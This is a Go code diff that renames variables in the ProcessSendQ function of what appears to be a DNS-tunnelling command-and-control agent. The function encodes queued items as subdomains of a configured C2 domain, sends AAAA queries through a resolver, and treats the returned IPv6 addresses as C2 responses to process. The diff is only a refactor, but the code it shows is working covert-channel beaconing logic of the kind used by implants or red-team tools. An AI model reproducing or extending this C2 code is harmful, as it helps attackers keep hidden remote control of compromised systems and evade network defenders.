@@ -215,23 +215,23 @@ func (a *Agent) ProcessSendQ() {
 			query := antiCacheValue + "." + item + "." + a.config.C2Domain
 
 			// var err error
-			var response []string
+			var c2Response []string
 
-			m := new(dns.Msg)
-			m.SetQuestion(query+".", dns.TypeAAAA)
-			m.RecursionDesired = true
-			c := new(dns.Client)
-			in, _, err := c.Exchange(m, a.config.Resolver)
+			dnsMessage := new(dns.Msg)
+			dnsMessage.SetQuestion(query+".", dns.TypeAAAA)
+			dnsMessage.RecursionDesired = true
+			dnsClient := new(dns.Client)
+			dnsResponse, _, err := dnsClient.Exchange(dnsMessage, a.config.Resolver)
 			// log.Printf("raw: %s %s %s", in, rtt, err)
 			if err != nil {
 				// fmt.Printf("Error getting the IPv6 address: %s\n", err)
-			} else if in.Rcode != dns.RcodeSuccess {
+			} else if dnsResponse.Rcode != dns.RcodeSuccess {
 				// fmt.Printf("Error getting the IPv6 address: %s\n", dns.RcodeToString[in.Rcode])
 			} else {
-				for _, aaaa := range in.Answer {
-					switch t_aaaa := aaaa.(type) {
+				for _, record := range dnsResponse.Answer {
+					switch recordType := record.(type) {
 					case *dns.AAAA:
-						response = append(response, t_aaaa.AAAA.String())
+						c2Response = append(c2Response, recordType.AAAA.String())
 					}
 				}
 			}
@@ -250,12 +250,11 @@ func (a *Agent) ProcessSendQ() {
 			// ip, _ := r.LookupHost(context.Background(), query)
 			// log.Printf("ips: %s\n",ip[0])
 
-			if len(response) > 0 {
-				// fmt.Printf("answer: %s", response)
+			if len(c2Response) > 0 {
 				// process response
-				log.Printf("c2 response for %q: %s\n", query, response)
+				log.Printf("c2 response for %q: %s\n", query, c2Response)
 				delete(a.sendq, item)
-				a.ProcessResponse(response)
+				a.ProcessResponse(c2Response)
 			} else {
 				log.Printf("c2 response for: %q was empty\n", query)
 			}
